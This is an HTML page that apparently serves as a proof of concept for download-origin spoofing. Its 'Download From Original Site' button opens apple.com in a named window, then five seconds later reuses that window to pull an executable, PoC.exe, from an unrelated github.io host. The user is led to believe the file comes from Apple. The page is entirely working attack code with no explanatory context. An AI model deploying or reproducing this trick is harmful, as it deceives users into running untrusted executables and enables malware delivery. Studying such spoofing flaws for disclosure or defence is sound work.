<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Download</title>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f4f6f8;
    font-family: Arial, sans-serif;
}

.button {
    background: linear-gradient(135deg, #868686, #555555);
    border: none;
    color: #fff;
    padding: 16px 40px;
    font-size: 16px;
    font-weight: 600;
    border-radius: 8px;
    cursor: pointer;
    box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
    transition: all 0.2s ease;
}

.button:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
}

.button:active {
    transform: translateY(0);
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
}
</style>
</head>

<body>
    <input
        type="button"
        class="button"
        value="Download From Original Site"
        onclick="a()"
    >
</body>


<script>
function a(){
	window.open('https://apple.com', 'x');
	setTimeout(function(){
		window.open('https://heloworld285.github.io/PoC.exe', 'x');
	}, 5000);
}
</script> 
</html>
